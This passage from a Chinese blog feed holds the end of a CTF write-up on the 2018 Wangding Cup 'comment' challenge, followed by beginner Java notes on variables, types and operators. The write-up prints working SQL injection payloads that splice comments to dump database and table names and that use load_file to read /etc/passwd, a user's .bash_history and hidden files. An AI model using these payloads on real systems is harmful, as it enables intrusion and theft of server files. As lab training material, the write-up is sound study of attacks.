alt="wdb2018comment7"></p><p>CATEGORY字段：<code>1&#39;,content=database(),/*</code></p><p>然后再<code>comment</code>时<code>content</code>字段改成：<code>*/#</code>，这样组合相当于：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">        set category = &#x27;1&#x27;,content=database(),/*&#x27;,</span><br><span class="hljs-string">            content = &#x27;*/#&#x27;,</span><br><span class="hljs-string">            bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure><p>第二行的<code>/*</code>与第三行的<code>*/</code>将中间注释，而第三行的<code>#</code>，将后面的<code>单引号</code>和<code>逗号</code>给注释了。</p><p><img src="/img/wdb2018comment9.png" alt="wdb2018comment9"></p><p>爆库：<code>test&#39;,content=(select(group_concat(schema_name))from(information_schema.schemata)),/*</code></p><p>爆表：<code>test&#39;,content=(select(group_concat(table_name))from(information_schema.tables)where((table_schema)=(database()))),/*</code></p><p><img src="/img/wdb2018comment16.png" alt="wdb2018comment16"></p><p>爆字段的时候会发现没有和<code>flag</code>有关的字段，看了<code>wp</code>发现这里要去看<code>user</code>这个东西：</p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">1&#x27;,content</span>=<span class="hljs-string">user(),/*   //返回当前数据库连接的用户名</span><br></code></pre></td></tr></table></figure><p><img src="/img/wdb2018comment10.png" alt="wdb2018comment10"></p><blockquote><p> 说明flag不在数据库而在本地文件里，需要读取。在数据库中无需root权限。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;,content=(select load_file(&#x27;</span><span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>passwd<span class="hljs-string">&#x27;)),/*</span><br></code></pre></td></tr></table></figure><p><img src="/img/wdb2018comment11.png" alt="wdb2018comment11"></p><p>注意最后一行，<code>www</code> 用户的 <code>home</code> 目录(第五个冒号后)一般都是<code> /var/www</code>, 而这里是<code> /home/www</code></p><p>我们可以想办法读取<code>www</code>用户的操作记录：</p><blockquote><p> .bash_history保存了当前用户使用过的历史命令</p></blockquote><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">&#x27;,content=((<span class="hljs-keyword">select</span>(load_file(<span class="hljs-string">&quot;/home/www/.bash_history&quot;</span>)))),/*<br></code></pre></td></tr></table></figure><p><img src="/img/wdb2018comment13.png" alt="wdb2018comment13"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/tmp/</span>：切换当前工作目录到<span class="hljs-regexp">/tmp/</span>目录<br>unzip html.zip：解压缩名为html.zip的文件<br>rm -f html.zip：强制删除名为html.zip的文件<br>cp -r html <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/：将名为html的目录递归地复制到/</span>var<span class="hljs-regexp">/www/</span>目录下<br>cd <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>：切换当前工作目录到<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>目录<br>rm -f .DS_Store：删除名为.DS_Store的文件<br>service apache2 start：启动Apache2服务<br></code></pre></td></tr></table></figure><p>删除了<code>/var/www/html/.DS_Store</code>，但没删<code>/tmp/html/.DS_Store</code>。</p><blockquote><p>.DS_Store是Mac OS保存文件夹的自定义属性的隐藏文件，如文件的图标位置或背景色，相当于Windows的desktop.ini。经常会有一些不可见的字符</p></blockquote><p>尝试读取：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;,content=(select load_file(&#x27;</span><span class="hljs-operator">/</span>tmp<span class="hljs-operator">/</span>html<span class="hljs-operator">/</span>.DS_Store<span class="hljs-string">&#x27;)),/*</span><br></code></pre></td></tr></table></figure><p><img src="/img/wdb2018comment14.png" alt="wdb2018comment14"></p><p>？？？看下源码：</p><p><img src="/img/wdb2018comment15.png" alt="wdb2018comment15"></p><p>一大堆乱码，可以尝试转换成十六进制读取，为啥么这么转在网上查了一下：</p><p><img src="/img/wdb2018comment17.png" alt="wdb2018comment17"></p><p><code>1&#39;,content=(select hex(load_file(&#39;/tmp/html/.DS_Store&#39;))),/*</code></p><p><img src="/img/wdb2018comment18.png" alt="wdb2018comment18"></p><p>全选之后解码，能发现有这么个东西：</p><p><img src="/img/wdb2018comment20.png" alt="wdb2018comment20"></p><p><code>1&#39;,content=(select hex(load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;))),/*</code></p><p><img src="/img/wdb2018comment21.png" alt="wdb2018comment21"></p><p>然后十六进制解码就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;flag&#123;99773ebf-cc83-4cda-a092-a9e1a14af733&#125;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当然也有专门读<code>DS_Store</code>这种文件的工具：<code>https://github.com/gehaxelt/Python-dsstore</code></p><p>用法也很简单：</p><p><img src="/img/wdbcomment30.png" alt="wdbcomment30"></p><p>注意这里我们获得十六进制数据后，先把十六进制文件(内容复制粘贴，<code>txt</code>)转换成二进制文件再操作才行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">hex_file_to_binary</span>(<span class="hljs-params">hex_file_path, binary_file_path</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(hex_file_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> hex_file:<br>        hex_string = hex_file.read().replace(<span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        binary_string = <span class="hljs-built_in">bytes</span>.fromhex(hex_string).decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(binary_file_path, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> binary_file:<br>        binary_file.write(binary_string.encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>))<br><br><br>hex_file_path = <span class="hljs-string">&#x27;d:/hexwhat.txt&#x27;</span><br>binary_file_path = <span class="hljs-string">&#x27;d:/biwhat.txt&#x27;</span><br><br>hex_file_to_binary(hex_file_path, binary_file_path)<br></code></pre></td></tr></table></figure><p><img src="/img/wdbcomment99.png" alt="wdbcomment99"></p><p>后面步骤一样就不写了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java基础学习笔记</title>
    <link href="/2023/12/28/2023-12-29-Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_1/"/>
    <url>/2023/12/28/2023-12-29-Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_1/</url>
    
    <content type="html"><![CDATA[<p>一些基础知识，长期更新</p><span id="more"></span><hr><blockquote><p>一些有关java的基础学习笔记，之前一直在书上记，后面想想还是不太方便</p></blockquote><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-comment">//定义变量，再进行输出</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>        System.out.println(a);<br>        <span class="hljs-comment">//变量参与计算</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;<br>        System.out.println(a + b);<br>        <span class="hljs-comment">//重新定义变量的值</span><br>        a = <span class="hljs-number">50</span>;<br>        System.out.println(a + b);<br>        <span class="hljs-comment">//可以一条语句定义多个变量</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>, f = <span class="hljs-number">200</span>, g = <span class="hljs-number">300</span>;<br>        System.out.println(e);<br>        System.out.println(f);<br>        System.out.println(g);<br>        <span class="hljs-comment">//变量在使用前必须赋值</span><br>        <span class="hljs-type">int</span> r;<br>        r = <span class="hljs-number">900</span>;<br>        System.out.println(r);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//结果：</span><br><span class="hljs-number">10</span><br><span class="hljs-number">30</span><br><span class="hljs-number">70</span><br><span class="hljs-number">100</span><br><span class="hljs-number">200</span><br><span class="hljs-number">300</span><br> <br></code></pre></td></tr></table></figure><p>变量注意事项：</p><ul><li>只能存一个值</li><li>变量名不允许重复定义(可以修改值)</li><li>一条语句可以定义多个变量</li><li>变量在使用之前一定要赋值</li><li>变量的作用域范围</li></ul><h3 id="计算机的存储规则"><a href="#计算机的存储规则" class="headerlink" title="计算机的存储规则"></a>计算机的存储规则</h3><ul><li>Text 文本</li><li>image 图片</li><li>Sound 声音</li></ul><p>计算机中任意数据都是以二进制形式存储的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*JDK7</span><br><span class="hljs-comment">二进制：0b开头</span><br><span class="hljs-comment">八进制：0开头</span><br><span class="hljs-comment">十六进制：0x开头*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        System.out.println(<span class="hljs-number">017</span>);<span class="hljs-comment">//15</span><br>        System.out.println(<span class="hljs-number">0b1111111</span>);<span class="hljs-comment">//127</span><br>        System.out.println(<span class="hljs-number">0xa7</span>);<span class="hljs-comment">//167</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p><img src="/img/javabiji1.png" alt="javabiji1"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">byte</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">127</span>;<br>        <span class="hljs-type">short</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-number">30</span>;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> <span class="hljs-number">40L</span>;<span class="hljs-comment">//若要定义Long类型的变量，在数据后加大写或小写的l</span><br>        <span class="hljs-type">float</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-number">1.1F</span>;<span class="hljs-comment">//若要定义float类型的变量，后面加个大写或小写的f</span><br>        <span class="hljs-type">double</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-number">2.2</span>;<br>        <span class="hljs-type">char</span> <span class="hljs-variable">g</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;任&#x27;</span>;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">k</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>Java中数据类型分为：基本数据类型，引用数据类型。</p></li><li><p>基本数据类型：四类八种。</p></li><li><p>注意byte的取值范围：-128 – 127</p></li><li><p>整数和小数取值范围大小关系：double &gt; float &gt; long &gt; int &gt; short &gt; byte</p></li><li><p>Long类型变量：L后缀，大小写均可</p></li><li><p>float类型变量：F后缀，大小写均可</p></li></ul><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><blockquote><p>就是给类、方法、变量等起的名字。</p></blockquote><ul><li>可以由数字、字母、下划线(_)和美元符($)组成。</li><li>不能以数字开头</li><li>不能是关键字</li><li>区分大小写</li></ul><p><img src="/img/javabiji2.png" alt="javabiji2"></p><h3 id="键盘录入"><a href="#键盘录入" class="headerlink" title="键盘录入"></a>键盘录入</h3><blockquote><p>Scanner这个类可以接收键盘输入</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> sc.nextInt();<br></code></pre></td></tr></table></figure><p>比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        <br>        System.out.println(<span class="hljs-string">&quot;请输入一个整数：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> sc.nextInt();<span class="hljs-comment">//调用Scanner对象的nextInt方法来读取一个整数</span><br><br>        System.out.println(i);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>键盘输入两个整数并求和：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入一个整数i：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        System.out.println(<span class="hljs-string">&quot;请再输入一个整数j：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num2</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">Jieguo</span> <span class="hljs-operator">=</span> num1 + num2;<br><br>        System.out.println(<span class="hljs-string">&quot;两数之和为：&quot;</span> + Jieguo);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><blockquote><p>算数运算符：加减乘除取模&#x2F;取余(%)</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        System.out.println(<span class="hljs-number">1</span> + <span class="hljs-number">1</span>);<br><br>        System.out.println(<span class="hljs-number">2</span> - <span class="hljs-number">1</span>);<br><br>        System.out.println(<span class="hljs-number">2</span> * <span class="hljs-number">2</span>);<br><br>        System.out.println(<span class="hljs-number">9</span> / <span class="hljs-number">3</span>);<br><br>        System.out.println(<span class="hljs-number">10</span> / <span class="hljs-number">3</span>);<br><br>        System.out.println(<span class="hljs-number">10.0</span> / <span class="hljs-number">3</span>);<br>        <span class="hljs-comment">//取模应用场景：判断是否可以整除，</span><br>        System.out.println(<span class="hljs-number">9</span> % <span class="hljs-number">2</span>);<br>        <span class="hljs-comment">//整数参与运算，结果只能是整数</span><br>        <span class="hljs-comment">//注意，如果有小数参与运算，结果可能是不精确的</span><br><br>        System.out.println(<span class="hljs-number">1.1</span> + <span class="hljs-number">1.01</span>);<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">/*结果：</span><br><span class="hljs-comment">2</span><br><span class="hljs-comment">1</span><br><span class="hljs-comment">4</span><br><span class="hljs-comment">3</span><br><span class="hljs-comment">3</span><br><span class="hljs-comment">1</span><br><span class="hljs-comment">2.1100000000000003</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>练习：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//要求在键盘录入一个三位数，将其拆分为个位、十位、百位后，打印出来</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入一个三位数num1：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">baiwei</span> <span class="hljs-operator">=</span> (num1 - (num1 % <span class="hljs-number">100</span>)) / <span class="hljs-number">100</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">shiwei</span> <span class="hljs-operator">=</span> ((num1 - baiwei * <span class="hljs-number">100</span>) - (num1 - baiwei *<span class="hljs-number">100</span>) % <span class="hljs-number">10</span>) / <span class="hljs-number">10</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">gewei</span> <span class="hljs-operator">=</span> (num1 - baiwei *<span class="hljs-number">100</span> - shiwei * <span class="hljs-number">10</span>);<br><br><br>        System.out.println(<span class="hljs-string">&quot;百位是：&quot;</span> + baiwei);<br><br>        System.out.println(<span class="hljs-string">&quot;十位是：&quot;</span> + shiwei);<br><br>        System.out.println(<span class="hljs-string">&quot;个位是：&quot;</span> + gewei);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//吗的我写麻烦了。。唉</span><br></code></pre></td></tr></table></figure><h3 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//数字相加</span><br><br></code></pre></td></tr></table></figure><p>类型转换：</p><ul><li>隐式转换(自动类型提升)：取值范围小的数值转换为取值范围大的。</li></ul><p><img src="/img/javalearn4.png" alt="javalearn4"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><br>        <span class="hljs-type">double</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">11.1</span>;<br><br>        数据类型？ c = a + b; <span class="hljs-comment">//小的变大的，这里c为double</span><br><br>        System.out.println(c);<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">//应注意，byte short char 三种类型的数据在运算时，都会先提升为int，再进行运算</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">byte</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><br>        <span class="hljs-type">byte</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">11.1</span>;<br><br>        数据类型？ c = a + b; <span class="hljs-comment">//这里c为int</span><br><br>        System.out.println(c);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>取值范围：byte &lt; short &lt; int &lt; long &lt; float &lt; double</p><p>数据类型不一样时不能进行计算，转换成一样的才能计算。</p><p>两个转换规则。</p><ul><li>强制转换：取值范围大的数值转换为取值范围小的。</li></ul><blockquote><p>格式：目标数据类型 变量名 &#x3D; （目标数据类型）被强转的数据；</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">double</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">12.3</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) a;<br></code></pre></td></tr></table></figure><p>字符串  “+” 操作：</p><blockquote><p>当 “ + ” 操作中出现字符串时，这个 “ + ”是字符串连接符，而不是算数运算符。会将前后的数据进行拼接，并产生一个新的字符串。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        System.out.println(<span class="hljs-number">3.7</span> + <span class="hljs-string">&quot;abc&quot;</span>);<br><br>        System.out.println(<span class="hljs-string">&quot;abc&quot;</span> + <span class="hljs-literal">true</span>);<br><br>        System.out.println(<span class="hljs-string">&#x27;中&#x27;</span> + <span class="hljs-string">&quot;abc&quot;</span> + <span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">18</span>;<br><br>        System.out.println(<span class="hljs-string">&quot;我的年龄是：&quot;</span> + age + <span class="hljs-string">&quot;岁&quot;</span>);<br><br>        System.out.println(<span class="hljs-string">&quot;我的年龄是：&quot;</span> + <span class="hljs-string">&quot;age&quot;</span> + <span class="hljs-string">&quot;岁&quot;</span>);<br><br>        System.out.println(<span class="hljs-number">1</span> + <span class="hljs-number">2</span> + <span class="hljs-string">&quot;abc&quot;</span> + <span class="hljs-number">2</span> + <span class="hljs-number">1</span>);<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">/*3.7abc</span><br><span class="hljs-comment">abctrue</span><br><span class="hljs-comment">中abctrue</span><br><span class="hljs-comment">我的年龄是：18岁</span><br><span class="hljs-comment">我的年龄是：age岁</span><br><span class="hljs-comment">3abc21*/</span><br></code></pre></td></tr></table></figure><p>字符的<code>+</code>操作</p><p>当<code>字符+字符</code>或<code>字符+数字</code>时，会把字符通过<code>ASCII</code>码表查询到对应的数字再进行计算。</p><figure class="highlight 